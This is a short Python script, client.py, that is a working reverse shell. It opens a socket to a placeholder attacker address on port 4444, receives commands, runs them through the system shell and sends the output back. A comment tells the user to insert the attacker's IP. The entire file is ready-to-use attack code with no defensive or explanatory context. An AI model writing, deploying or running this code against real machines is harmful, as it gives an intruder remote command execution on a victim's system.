# client.py
import socket
import subprocess

ip = 'ATTACKER_IP'  # Replace with attacker's IP
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

while True:
    command = s.recv(1024).decode()
    if command.lower() in ["exit", "quit"]:
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output

    s.send(output)

s.close()
